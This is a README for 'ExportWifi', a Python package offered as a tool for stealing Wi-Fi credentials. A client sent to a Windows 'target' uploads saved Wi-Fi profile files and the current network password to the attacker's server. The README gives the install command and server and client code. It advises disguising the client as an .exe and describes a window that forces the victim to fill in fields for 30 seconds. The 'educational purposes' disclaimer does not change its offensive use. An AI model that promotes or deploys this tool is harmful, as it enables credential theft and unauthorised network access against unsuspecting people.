ExportWifi
==========

Created by: Fawaz Bashiru

This a module which imports WI-FI files and detects the current WI-FI name and the current WI-FI password of the target. Every imported file is going to be saved in the directory where your server is located.

To install ExportWifi simply type:

`pip install ExportWifi`

In your Terminal

HOW DOES ExportWifi WORK?
-------------------------
The ip address and the port number should be the same so the connection will work


For Example:
============

Server
-----
````python
import ExportWifi as wifi

server = wifi.WlanServer("127.0.0.1", 1234)
server.start()
````

Client
------
````python
import ExportWifi as wifi

client = wifi.WlanClient("127.0.0.1", 1234)
client.start()
````

The User can't stop tkinter for 30 seconds and is forced to fill everything 
All the Wi-Fi Files will be saved to your directory where the server is located

Output of Server
---------------
````commandline
Waiting for connection....
Connection with ('127.0.0.1', 53343)

Connection has been established
6 Wifi files have been saved to your directory
The current WI-FI and Password of the target is 

WI-FI: ********* The Wi-Fi of the target will be here 
Password: ******* The password of the target will be here
````


Additional
----------
* You can send "client.py" as an exe file to the target with "auto-py-to-exe"

* ExportWifi is very easy to use.

* The server can be used for any OS. The target can only have a Windows OS

* DO NOT USE THIS TO ATTACK SOMEONE FOREIGN. I BUILD IT FOR EDUCATIONAL PURPOSES.